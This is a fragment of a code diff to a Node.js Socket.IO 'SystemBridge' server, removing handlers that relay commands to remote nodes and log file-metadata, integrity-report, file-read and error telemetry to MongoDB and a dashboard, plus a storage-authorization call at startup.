-                args: commandData.args || {},
-                nodeRuntime: targetSession.nodeRuntime || 'native_workspace'
-            });
-        } else {
-            console.warn(`❌ SystemBridge node ${commandData.nodeId} no encontrado o no registrado para comando ${commandData.command}.`);
-        }
-    });
-
-    socket.on('file_metadata', (metadata) => {
-        console.log('asset_sync metadata telemetry:', metadata);
-    });
-
-    socket.on('system_integrity_report', (report) => {
-        if (!report?.nodeId) {
-            console.warn('system_integrity_report ignored: missing nodeId');
-            return;
-        }
-
-        latestIntegrityReports[report.nodeId] = {
-            receivedAt: new Date().toISOString(),
-            summary: report.summary || {},
-            workspaceName: report.workspaceName || 'unknown_workspace'
-        };
-
-        logTelemetryToMongo('info', 'System integrity report received', {
-            nodeId: report.nodeId,
-            workspaceName: report.workspaceName || 'unknown_workspace',
-            totalFiles: report?.summary?.totalFiles || 0,
-            totalDirs: report?.summary?.totalDirs || 0,
-            totalBytes: report?.summary?.totalBytes || 0
-        });
-
-        io.emit('dashboard_update', {
-            type: 'system_integrity_report',
-            nodeId: report.nodeId,
-            summary: report.summary || {},
-            workspaceName: report.workspaceName || 'unknown_workspace',
-            timestamp: report.scannedAt || new Date().toISOString()
-        });
-    });
-
-    socket.on('file_content_result', (data) => {
-        if (!data?.nodeId) {
-            console.warn('file_content_result ignored: missing nodeId');
-            return;
-        }
-
-        console.log(`[File Content] ${data.path} read by node ${data.nodeId} (${data.size} bytes)`);
-        
-        logTelemetryToMongo('info', 'File content read', {
-            nodeId: data.nodeId,
-            path: data.path,
-            size: data.size
-        });
-
-        io.emit('dashboard_update', {
-            type: 'file_content_result',
-            nodeId: data.nodeId,
-            path: data.path,
-            size: data.size,
-            timestamp: data.timestamp
-        });
-    });
-
-    socket.on('file_action_error', (data) => {
-        if (!data?.nodeId) {
-            console.warn('file_action_error ignored: missing nodeId');
-            return;
-        }
-
-        console.error(`[File Action Error] ${data.action} failed: ${data.error}`);
-        
-        logTelemetryToMongo('error', `File action failed: ${data.action}`, {
-            nodeId: data.nodeId,
-            action: data.action,
-            error: data.error,
-            params: data.params
-        });
-
-        io.emit('dashboard_update', {
-            type: 'file_action_error',
-            nodeId: data.nodeId,
-            action: data.action,
-            error: data.error,
-            timestamp: data.timestamp
-        });
     });
 });
 
-// --- Startup ---
 async function startServer() {
-    await authorizeB2();
     await connectMongo();
-
 
     httpServer.listen(PORT, () => {
         console.log(`🚀 SystemBridge Server active on http://localhost:${PORT}`);
@@ -769,10 +407,9 @@ async function startServer() {
 
 startServer();
 
-// Graceful shutdown
 process.on('beforeExit', async () => {
     if (mongoose.connection.readyState === 1) {
         await mongoose.disconnect();
-        console.log("MongoDB connection closed (Mongoose).");
+        console.log('MongoDB connection closed (Mongoose).');
     }
 });
